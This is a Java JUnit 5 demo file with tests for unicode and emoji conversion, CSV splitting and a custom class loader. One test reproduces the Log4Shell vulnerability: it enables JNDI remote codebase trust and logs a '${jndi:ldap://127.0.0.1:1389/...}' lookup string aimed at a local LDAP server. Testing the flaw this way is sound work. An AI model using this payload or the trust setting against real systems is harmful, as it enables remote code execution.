import com.yiban.javaBase.dev.classloader.MyClassLoader;
import lombok.extern.log4j.Log4j2;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.*;

import java.io.*;
import java.net.URLEncoder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @auther WEI.DUAN
 * @date 2021/6/5
 * @website http://blog.csdn.net/dwshmilyss
 */
public class Junit5Demo {
    @BeforeEach
    public void before() {
        System.out.println("before");
    }

    /**
     * 中文转unicode
     *
     * @param string
     * @return
     */
    public static String unicodeEncode(String string) {
        char[] utfBytes = string.toCharArray();
        String unicodeBytes = "";
        for (int i = 0; i < utfBytes.length; i++) {
            String hexB = Integer.toHexString(utfBytes[i]);
            if (hexB.length() <= 2) {
                hexB = "00" + hexB;
            }
            unicodeBytes = unicodeBytes + "\\u" + hexB;
        }
        return unicodeBytes;
    }

    /**
     * unicode转中文
     */
    public static String unicodeDecode(String string) {
        Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{4}))");
        Matcher matcher = pattern.matcher(string);
        char ch;
        while (matcher.find()) {
            ch = (char) Integer.parseInt(matcher.group(2), 16);
            string = string.replace(matcher.group(1), ch + "");
        }
        return string;
    }

    @org.junit.jupiter.api.Test
    public void test() {
        String csv = "/Users/edz/Desktop/test.csv";
        BufferedReader br = null;
        String line = "";
        String csvSplitBy = ",(?=([^\"]*\"[^\"]*\")*[^\"]*$)";
        try {
            br = new BufferedReader(new FileReader(csv));
            while ((line = br.readLine()) != null) {
                //use comma as separatpr
                String[] major = line.split(csvSplitBy);
                System.out.println(major.length);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * 解析emoji
     *
     * @param num
     * @return
     */
    public static byte[] int2bytes(int num) {
        byte[] result = new byte[4];
        result[0] = (byte) ((num >>> 24) & 0xff);//说明一
        result[1] = (byte) ((num >>> 16) & 0xff);
        result[2] = (byte) ((num >>> 8) & 0xff);
        result[3] = (byte) ((num >>> 0) & 0xff);
        return result;
    }

    private static String getBytesCode(byte[] bytes) {
        String code = "";
        for (byte b : bytes) {
            code += "\\x" + Integer.toHexString(b & 0xff);
        }
        return code;
    }

    @org.junit.jupiter.api.Test
    public void testEmoji() throws UnsupportedEncodingException {
//        String res = URLEncoder.encode("倩倩有个\uD83D\uDC23阿柚吖\uD83C\uDF4A");
        String str = "倩倩有个\uD83D\uDC23阿柚吖\uD83C\uDF4A";
        String res = unicodeEncode(str);
        String unicode = "\uD83C\uDF4A";

        String res1 = unicodeDecode(unicode);
        System.out.println("res = " + res);
        System.out.println("res1 = " + res1);

        //编码转emoji
//        String emojiName = "1f601";  //其实4个字节
        String emojiName = "24C2";
        int emojiCode = Integer.valueOf(emojiName, 16);
        byte[] emojiBytes = int2bytes(emojiCode);
        String emojiChar = new String(emojiBytes, "utf-32");
        System.out.println(emojiChar);
        //emoji转编码
        byte[] bytes = "\uD83C\uDF4A".getBytes("utf-32");
        System.out.println(getBytesCode(bytes));
    }

    @org.junit.jupiter.api.Test
    public void testClassLoader() throws ClassNotFoundException, InstantiationException, IllegalAccessException {
        MyClassLoader myClassLoader = new MyClassLoader("/Users/edz/.m2/repository/com/facebook/presto/presto-jdbc/0.253.1/presto-jdbc-0.253.1.jar!/com/facebook/presto/jdbc/PrestoDriver.class");
        Class clazz = myClassLoader.loadClass("com.facebook.presto.jdbc.PrestoDriver");
        Object obj = clazz.newInstance();
        System.out.println(obj);
        System.out.println(obj.getClass().getClassLoader());
    }

    private static final Logger logger = LogManager.getLogger(Log4j2.class);
    @org.junit.jupiter.api.Test
    public void testLog4j2Venerability() {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("params:{}", "${jndi:ldap://127.0.0.1:1389/Log4jTest}");
//        logger.error("params:{}", "${java:version}");
    }

    @AfterEach
    public void after() {
        System.out.println("after");
    }

    @BeforeAll
    public static void beforeAll() {
        System.out.println("beforeAll");
    }

    @AfterAll
    public static void afterAll() {
        System.out.println("afterAll");
    }
}